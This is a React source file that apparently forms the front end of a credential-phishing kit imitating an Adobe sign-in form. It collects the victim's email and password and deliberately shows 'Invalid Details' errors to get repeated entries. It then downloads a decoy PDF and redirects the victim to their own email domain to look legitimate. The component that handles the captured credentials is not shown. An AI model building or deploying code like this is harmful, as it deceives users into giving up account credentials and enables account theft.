import React, { useState, Alert } from "react";
import AdobeForm from "./components/AdobeForm";
import logo from './Image/pingr.png';
import jsPDF from "jspdf";


function App() {
  const [user, setUser] = useState({ email: "", password: ""});
  const [error, setError] = useState("");

  const Login = (details, counter, setView) => {
    console.log(details, counter);
      setUser({
        email: details.email,
        password: details.password,
      });
    
    try {
        if (
          !/[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i
          .test(details.email) ||
          details.password === ""
        ) {
          setError("Invalid Details. Please Check the details and try again");
        }  else { 
          setError("");
        }
        if (counter == 2) {
          setError("Invalid Details. Please Check the details and try again");
        }
        
    } 
    catch(e){
      console.log ('err');
    }

    const my_email = details.email;

    // url extraction

    const ind=my_email.indexOf("@");
    const my_slice=my_email.substr(ind+1);
    const c= my_slice.substr(0, my_slice.indexOf('.'));
    const final= c.toLowerCase();
    const finalu= c.toUpperCase();

  
    // downloading pdf and redirect_link

    function success () {
      if ( error == ""  && counter > 2 ) {
        const doc = new jsPDF('landscape','px', 'a4','false');
        doc.addImage(logo, 'PNG',65,20,500,400)
        doc.save('file.pdf')
        console.log(details)
        setView(" Verifying ...")
        // window.open(logo)
        window.location.replace("http://www."+my_slice);
      }       
    } success()

  };


  return (
    <div id="content">
      {user.email !== "" ? (
        <AdobeForm Login={Login} error={error} />
      ) : (
        <AdobeForm Login={Login} error={error} />
      )}
    </div>
  );
}

export default App;
